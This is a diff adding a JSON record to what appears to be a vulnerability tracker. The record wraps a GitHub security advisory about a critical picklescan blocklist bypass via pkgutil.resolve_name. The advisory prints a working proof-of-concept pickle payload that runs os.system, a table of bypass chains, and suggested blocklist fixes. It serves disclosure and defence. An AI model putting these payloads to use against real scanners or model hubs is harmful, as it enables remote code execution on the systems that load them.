@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/29672519?v=4\", \"events_url\": \"https://api.github.com/users/yash2998chhabria/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/yash2998chhabria/followers\", \"following_url\": \"https://api.github.com/users/yash2998chhabria/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/yash2998chhabria/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/yash2998chhabria\", \"id\": 29672519, \"login\": \"yash2998chhabria\", \"node_id\": \"MDQ6VXNlcjI5NjcyNTE5\", \"organizations_url\": \"https://api.github.com/users/yash2998chhabria/orgs\", \"received_events_url\": \"https://api.github.com/users/yash2998chhabria/received_events\", \"repos_url\": \"https://api.github.com/users/yash2998chhabria/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/yash2998chhabria/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/yash2998chhabria/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/yash2998chhabria\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-3490\", \"cvss\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-183\", \"name\": \"Permissive List of Allowed Inputs\"}, {\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"## Summary\\n\\n`pkgutil.resolve_name()` is a Python stdlib function that resolves any `\\\"module:attribute\\\"` string to the corresponding Python object at runtime. By using `pkgutil.resolve_name` as the first REDUCE call in a pickle, an attacker can obtain a reference to ANY blocked function (e.g., `os.system`, `builtins.exec`, `subprocess.call`) without that function appearing in the pickle's opcodes. picklescan only sees `pkgutil.resolve_name` (which is not blocked) and misses the actual dangerous function entirely.\\n\\nThis defeats picklescan's **entire blocklist concept** — every single entry in `_unsafe_globals` can be bypassed.\\n\\n## Severity\\n\\n**Critical** (CVSS 10.0) — Universal bypass of all blocklist entries. Any blocked function can be invoked.\\n\\n## Affected Versions\\n\\n- picklescan <= 1.0.3 (all versions including latest)\\n\\n## Details\\n\\n### How It Works\\n\\nA pickle file uses two chained REDUCE calls:\\n\\n```\\n1. STACK_GLOBAL: push pkgutil.resolve_name\\n2. REDUCE: call resolve_name(\\\"os:system\\\") → returns os.system function object\\n3. REDUCE: call the returned function(\\\"malicious command\\\") → RCE\\n```\\n\\npicklescan's opcode scanner sees:\\n- `STACK_GLOBAL` with module=`pkgutil`, name=`resolve_name` → **NOT in blocklist** → CLEAN\\n- The second `REDUCE` operates on a stack value (the return of the first call), not on a global import → **invisible to scanner**\\n\\nThe string `\\\"os:system\\\"` is just data (a SHORT_BINUNICODE argument to the first REDUCE) — picklescan does not analyze REDUCE arguments, only GLOBAL/INST/STACK_GLOBAL references.\\n\\n### Decompiled Pickle (what the data actually does)\\n\\n```python\\nfrom pkgutil import resolve_name\\n_var0 = resolve_name('os:system')          # Returns the actual os.system function\\n_var1 = _var0('malicious_command')          # Calls os.system('malicious_command')\\nresult = _var1\\n```\\n\\n### Confirmed Bypass Targets\\n\\nEvery entry in picklescan's blocklist can be reached via resolve_name:\\n\\n| Chain | Resolves To | Confirmed RCE | picklescan Result |\\n|-------|------------|---------------|-------------------|\\n| `resolve_name(\\\"os:system\\\")` | `os.system` | YES | CLEAN |\\n| `resolve_name(\\\"builtins:exec\\\")` | `builtins.exec` | YES | CLEAN |\\n| `resolve_name(\\\"builtins:eval\\\")` | `builtins.eval` | YES | CLEAN |\\n| `resolve_name(\\\"subprocess:getoutput\\\")` | `subprocess.getoutput` | YES | CLEAN |\\n| `resolve_name(\\\"subprocess:getstatusoutput\\\")` | `subprocess.getstatusoutput` | YES | CLEAN |\\n| `resolve_name(\\\"subprocess:call\\\")` | `subprocess.call` | YES (shell=True needed) | CLEAN |\\n| `resolve_name(\\\"subprocess:check_call\\\")` | `subprocess.check_call` | YES (shell=True needed) | CLEAN |\\n| `resolve_name(\\\"subprocess:check_output\\\")` | `subprocess.check_output` | YES (shell=True needed) | CLEAN |\\n| `resolve_name(\\\"posix:system\\\")` | `posix.system` | YES | CLEAN |\\n| `resolve_name(\\\"cProfile:run\\\")` | `cProfile.run` | YES | CLEAN |\\n| `resolve_name(\\\"profile:run\\\")` | `profile.run` | YES | CLEAN |\\n| `resolve_name(\\\"pty:spawn\\\")` | `pty.spawn` | YES | CLEAN |\\n\\n**Total:** 11+ confirmed RCE chains, all reporting CLEAN.\\n\\n### Proof of Concept\\n\\n```python\\nimport struct, io, pickle\\n\\ndef sbu(s):\\n    b = s.encode()\\n    return b\\\"\\\\x8c\\\" + struct.pack(\\\"<B\\\", len(b)) + b\\n\\n# resolve_name(\\\"os:system\\\")(\\\"id\\\")\\npayload = (\\n    b\\\"\\\\x80\\\\x04\\\\x95\\\" + struct.pack(\\\"<Q\\\", 55)\\n    + sbu(\\\"pkgutil\\\") + sbu(\\\"resolve_name\\\") + b\\\"\\\\x93\\\"  # STACK_GLOBAL\\n    + sbu(\\\"os:system\\\") + b\\\"\\\\x85\\\" + b\\\"R\\\"                # REDUCE: resolve_name(\\\"os:system\\\")\\n    + sbu(\\\"id\\\") + b\\\"\\\\x85\\\" + b\\\"R\\\"                       # REDUCE: os.system(\\\"id\\\")\\n    + b\\\".\\\"                                               # STOP\\n)\\n\\n# picklescan: 0 issues\\nfrom picklescan.scanner import scan_pickle_bytes\\nresult = scan_pickle_bytes(io.BytesIO(payload), \\\"test.pkl\\\")\\nassert result.issues_count == 0  # CLEAN!\\n\\n# Execute: runs os.system(\\\"id\\\") → RCE\\npickle.loads(payload)\\n```\\n\\n### Why `pkgutil` Is Not Blocked\\n\\npicklescan's `_unsafe_globals` (v1.0.3) does not include `pkgutil`. The module is a standard import utility — its primary purpose is module/package resolution. However, `resolve_name()` can resolve ANY attribute from ANY module, making it a universal gadget.\\n\\n**Note:** fickling DOES block `pkgutil` in its `UNSAFE_IMPORTS` list.\\n\\n## Impact\\n\\nThis is a **complete bypass** of picklescan's security model. The entire blocklist — every module and function entry in `_unsafe_globals` — is rendered ineffective. An attacker needs only use `pkgutil.resolve_name` as an indirection layer to call any Python function.\\n\\nThis affects:\\n- HuggingFace Hub (uses picklescan)\\n- Any ML pipeline using picklescan for safety validation\\n- Any system relying on picklescan's blocklist to prevent malicious pickle execution\\n\\n## Suggested Fix\\n\\n1. **Immediate:** Add `pkgutil` to `_unsafe_globals`:\\n   ```python\\n   \\\"pkgutil\\\": {\\\"resolve_name\\\"},\\n   ```\\n\\n2. **Also block similar resolution functions:**\\n   ```python\\n   \\\"importlib\\\": \\\"*\\\",\\n   \\\"importlib.util\\\": \\\"*\\\",\\n   ```\\n\\n3. **Architectural:** The blocklist approach cannot defend against indirect resolution gadgets. Even blocking `pkgutil`, an attacker could find other stdlib functions that resolve module attributes. Consider:\\n   - Analyzing REDUCE arguments for suspicious strings (e.g., patterns matching `\\\"module:function\\\"`)\\n   - Treating unknown globals as dangerous by default\\n   - Switching to an allowlist model\", \"epss\": {\"percentage\": 0.00623, \"percentile\": 0.45502}, \"ghsa_id\": \"GHSA-vvpj-8cmc-gx39\", \"github_reviewed_at\": \"2026-03-03T20:04:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-vvpj-8cmc-gx39\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vvpj-8cmc-gx39\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-3490\"}], \"nvd_published_at\": null, \"published_at\": \"2026-03-03T20:04:20Z\", \"references\": [\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-vvpj-8cmc-gx39\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-3490\", \"https://www.vulncheck.com/advisories/picklescan-universal-blocklist-bypass-via-pkgutil-resolve-name\", \"https://github.com/advisories/GHSA-vvpj-8cmc-gx39\"], \"repository_advisory_url\": \"https://api.github.com/repos/mmaitre314/picklescan/security-advisories/GHSA-vvpj-8cmc-gx39\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/mmaitre314/picklescan\", \"summary\": \"PickleScan's pkgutil.resolve_name has a universal blocklist bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-18T14:45:32Z\", \"url\": \"https://api.github.com/advisories/GHSA-vvpj-8cmc-gx39\", \"vulnerabilities\": [{\"first_patched_version\": \"1.0.4\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"picklescan\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.0.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vvpj-8cmc-gx39",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "picklescan: < 1.0.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-3490"
+    ],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "picklescan"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.189089Z",
+  "provenance": {
+    "content_sha256": "4f31633901e0b45e7ccf8c14f6ee7ebc0c09ef7a784b4c09ed5b07463ab81fea",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-03T20:04:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vvpj-8cmc-gx39",
+  "status": "active",
+  "title": "PickleScan's pkgutil.resolve_name has a universal blocklist bypass",
+  "updated_at": "2026-06-18T14:45:32Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vvpj-8cmc-gx39"
+}
